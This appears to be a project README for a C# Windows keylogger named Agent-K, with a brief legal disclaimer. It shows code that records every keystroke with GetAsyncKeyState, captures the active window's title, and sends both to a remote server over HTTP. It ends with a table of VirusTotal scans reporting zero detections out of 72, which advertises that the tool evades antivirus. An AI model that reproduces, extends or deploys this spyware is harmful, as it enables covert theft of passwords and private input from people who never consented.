# Agent-K
.NET C# Basic Keylogger

## Disclaimer
> This software is intended ***exclusively for educational purposes and ethical cybersecurity research***. It is designed to help users understand potential vulnerabilities in systems so they can improve their security.
>
> By using this software, you agree to use it in compliance with all applicable laws and regulations. Unauthorized use, distribution, or deployment of this software against any system without the explicit permission of the system owner is strictly prohibited and may result in criminal and civil penalties.
>
> The creator(s) of this software assume no liability and are not responsible for any misuse or damages arising from the use of this software. Always obtain proper authorization before testing or analyzing systems using this software.

## Features
1. Keystroke Logging
* Captures all key presses.<br>
**WinAPI GetAsyncKeyState() from user32.dll**
```cs
for (int i = 0; i < 255; i++)
{
    int keyState = GetAsyncKeyState(i);
    if (KEY_STATE_LIST.Contains(keyState))
    {
        string key = GetKeyString(i);
        ...
    }
}
```

2. Window Tracking
Retrieves the title of the currently focused window.<br>
**WinAPI GetForegroundWindow() from user32.dll**
```cs
private static string GetWinText()
{
    StringBuilder title = new StringBuilder(256);
    IntPtr hWindow = GetForegroundWindow();
    GetWindowText(hWindow, title, title.Capacity);
    return title.ToString();
}
```

3. Data Transmission
* Sends the key data and window title to a remote server via HTTP.<br>
**C# HttpClient (System.Web)**
```cs
private static async void send(string title, string key, int i) 
{
    HttpClient client = new HttpClient();
    string encodedTitle = HttpUtility.UrlEncode(title);
    string encodedKey = HttpUtility.UrlEncode(key);
    string encodedIndex = HttpUtility.UrlEncode(i.ToString());
    string url = $"{SERVER}?title={title}&char={encodedKey}&index={encodedIndex}";
    HttpResponseMessage response = await client.GetAsync(url);
}
```

## VirusTotal Score
| Version           | Virus Total Link                  | Score             |
|-------------------|-----------------------------------|-------------------|
| Agent-K 1.0.0     | [f5331bde71228ed3604806ebcd0c6d9bb11c04ed8b76ae11cadd05bd7f5f9c58](https://www.virustotal.com/gui/file/f5331bde71228ed3604806ebcd0c6d9bb11c04ed8b76ae11cadd05bd7f5f9c58?nocache=1) | 0/72
| Agent-K 1.0.0 ZIP | [a29eb2f65b674aa216e5a9c674b79b23bda5f466fb74b6048fa0c6da22380919](https://www.virustotal.com/gui/file/a29eb2f65b674aa216e5a9c674b79b23bda5f466fb74b6048fa0c6da22380919?nocache=1) | 0/72
| Agent-K 1.0.0     | [c9e042bdf7db9aef8f296d765e8c179f037a27a2d2cf80b2183a2fb674c4e64c](https://www.virustotal.com/gui/file/c9e042bdf7db9aef8f296d765e8c179f037a27a2d2cf80b2183a2fb674c4e64c/detection) | 0/72